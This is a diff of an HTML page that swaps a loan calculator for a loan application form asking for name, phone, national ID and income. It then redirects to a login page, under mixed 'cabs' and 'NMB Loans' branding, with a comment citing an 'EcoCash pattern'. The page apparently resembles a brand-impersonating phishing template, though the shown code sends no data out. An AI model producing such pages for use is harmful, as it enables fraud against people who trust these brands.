@@ -1493,138 +1493,64 @@
         }
     </style>
 </head>
-
-<body>
-
-    <body>
-        <div id="root">
-            <div>
-                <div class="loan-calculator-container">
-                    <div>
-                        <header class="_topHeader_etq7j_1"><img alt="cabs" src="cabslogo.jpeg">
-                            <div><svg xmlns="http://www.w3.org/2000/svg" width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="blue" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-user" aria-hidden="true"><path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
-                                <h1>Welcome </h1>
-                            </div>
-                        </header>
-                    </div>
-                    <div class="calculator-header">
-                        <h1>Get Your Loan Approved <span class="fast-text">Fast</span></h1>
-                        <p class="subtitle">Quick approval • Competitive rates • Flexible terms</p>
-                    </div>
-                    <div class="calculator-content">
-                        <div class="calculator-section">
-                            <h2 class="section-title">Loan Calculator</h2>
-                            <div class="calculator-control"><label class="control-label">Loan Amount</label>
-                                <div class="amount-display">$500</div>
-                                <div class="slider-container"><input min="500" max="50000" step="100" class="amount-slider" type="range" value="500">
-                                    <div class="slider-labels"><span>USD 500</span><span>USD 50,000</span></div>
-                                </div>
-                            </div>
-                            <div class="calculator-control"><label class="control-label">Loan Term</label>
-                                <div class="term-display">12 months</div>
-                                <div class="term-buttons"><button class="term-button ">6 months</button><button class="term-button active">12 months</button><button class="term-button ">24 months</button><button class="term-button ">36 months</button><button class="term-button ">48 months</button>
-                                    <button class="term-button ">60 months</button>
-                                </div>
-                            </div>
-                            <div class="payment-display">
-                                <div class="payment-label">Monthly Payment</div>
-                                <div class="payment-amount">$42.69</div>
-                                <div class="interest-rate">Interest rate: 4.5% APR</div>
-                            </div><button class="apply-button">APPLY NOW</button></div>
-                        <div class="features-section">
-                            <div class="feature-card">
-                                <div class="feature-icon">⚡</div>
-                                <div class="feature-content">
-                                    <h3 class="feature-title">Fast Approval</h3>
-                                    <p class="feature-desc">Within 24 hours</p>
-                                </div>
-                            </div>
-                            <div class="feature-card">
-                                <div class="feature-icon">💰</div>
-                                <div class="feature-content">
-                                    <h3 class="feature-title">Low Rates</h3>
-                                    <p class="feature-desc">From 8%</p>
-                                </div>
-                            </div>
-                            <div class="feature-card">
-                                <div class="feature-icon">🔒</div>
-                                <div class="feature-content">
-                                    <h3 class="feature-title">Secure</h3>
-                                    <p class="feature-desc">Bank-level security</p>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
+<div class="_container_ckb9m_6">
+    <div class="_containe_ckb9m_6">
+        <div>
+            <header class="_topHeader_etq7j_1"><img alt="cabs" src="cabslogo.jpeg">
+                <div><svg xmlns="http://www.w3.org/2000/svg" width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="blue" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-user" aria-hidden="true"><path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
+                    <h1>Welcome </h1>
                 </div>
-            </div>
+            </header>
         </div>
-        <script>
-            // Get all the elements
-            const amountSlider = document.querySelector('.amount-slider');
-            const termButtons = document.querySelectorAll('.term-button');
-            const amountDisplay = document.querySelector('.amount-display');
-            const termDisplay = document.querySelector('.term-display');
-            const paymentAmount = document.querySelector('.payment-amount');
-            const interestRate = document.querySelector('.interest-rate');
-            const applyButton = document.querySelector('.apply-button');
+        <section class="_intro_ckb9m_46">
+            <h2>Loan Application</h2>
+            <p class="_helpText_ckb9m_51">Please fill in all required details accurately. All information is kept confidential and used only for loan processing and verification only.</p>
+        </section>
+        <section class="_dataFields_ckb9m_70">
+            <div><label for="name">Full name</label><input required="" type="text" value=""></div>
+            <div><label for="phone"> Phone Number</label><input maxlength="10" placeholder="0785345678" type="number" value=""></div>
+            <div><label for="id">National ID</label><input type="text" value=""></div>
+            <div><label for="name">Lon Amount(USD)</label><input class="no-spinner" placeholder="USD 10,000 " type="number" value=""></div>
+            <div><label>Employment Status</label><select><option value="selfemployed">Self-Employed</option><option value="employed">Employed</option><option value="unemployed">Unemployed</option><option value="student">Student</option></select></div>
+            <div><label for="name">Monthy Net Income</label><input class="no-spinner" placeholder="USD 0.00 " type="number"></div>
+            <div><label for="select"> Repayment</label><select><option value="selfemployed">6 months</option><option value="employed">12 months</option><option value="unemployed">18 months</option><option value="student">24 months</option></select></div>
+        </section>
+        <section class="_footer_ckb9m_115">
+            <div class="_terms_ckb9m_124"><input required="" type="checkbox">
+                <p>I confirm that the information provided is true and I agree to the NMB Loans terms and conditions.</p>
+            </div>
+            <div class="_apllyBtn_ckb9m_162"><button>SUBMIT APPLICATION</button></div>
+        </section>
+    </div>
+</div>
+<script>
+    // Handle image error - if nmbimage.png doesn't load, show a text fallback
+    document.querySelector('._topHeader_etq7j_1 img').onerror = function() {
+        this.style.display = 'none';
+    };
 
-            let selectedTerm = 12; // default months
+    // Submit button - navigate to login.html
+    document.querySelector('._apllyBtn_ckb9m_162 button').addEventListener('click', function(e) {
+        e.preventDefault();
 
-            // --- Update term button active state ---
-            termButtons.forEach(btn => {
-                btn.addEventListener('click', function() {
-                    // Remove active class from all term buttons
-                    termButtons.forEach(b => b.classList.remove('active'));
-                    // Add active to the clicked one
-                    this.classList.add('active');
-                    // Extract the number of months from the button text
-                    const match = this.textContent.trim().match(/(\d+)\s*months?/);
-                    if (match) {
-                        selectedTerm = parseInt(match[1]);
-                    }
-                    updateCalculator();
-                });
-            });
+        // Optional: basic validation check
+        const name = document.querySelector('input[type="text"]').value.trim();
+        const phone = document.querySelector('input[placeholder="0785345678"]').value.trim();
 
-            // --- Update amount display from slider ---
-            amountSlider.addEventListener('input', function() {
-                updateCalculator();
-            });
+        if (!name || !phone) {
+            alert('Please fill in your full name and phone number.');
+            return;
+        }
 
-            // --- The core calculation function ---
-            function updateCalculator() {
-                const amount = parseFloat(amountSlider.value);
-                const months = selectedTerm;
+        // Save form data to localStorage (like the EcoCash pattern)
+        localStorage.setItem('applicantName', name);
+        localStorage.setItem('applicantPhone', phone);
+        localStorage.setItem('loanAmount', document.querySelector('input[placeholder="USD 10,000 "]').value);
 
-                // Update display values
-                amountDisplay.textContent = '$' + amount.toLocaleString();
-                termDisplay.textContent = months + (months === 1 ? ' month' : ' months');
-
-                // Interest rate: 8% APR
-                const annualRate = 0.08;
-                interestRate.textContent = 'Interest rate: 8% APR';
-
-                // Monthly payment formula (amortization)
-                const monthlyRate = annualRate / 12;
-                if (months === 0) {
-                    paymentAmount.textContent = '$' + amount.toFixed(2);
-                } else {
-                    const power = Math.pow(1 + monthlyRate, months);
-                    const monthlyPayment = amount * (monthlyRate * power) / (power - 1);
-                    paymentAmount.textContent = '$' + monthlyPayment.toFixed(2);
-                }
-            }
-
-            // --- Initialize ---
-            updateCalculator();
-
-            // --- Apply Now button navigates to apply.html ---
-            applyButton.addEventListener('click', function() {
-                localStorage.setItem('loanAmount', amountSlider.value);
-                localStorage.setItem('loanTerm', selectedTerm.toString());
-                window.location.href = 'apply.html';
-            });
-        </script>
-    </body>
+        // Navigate to login.html
+        window.location.href = 'login.html';
+    });
+</script>
+</body>
 
 </html>
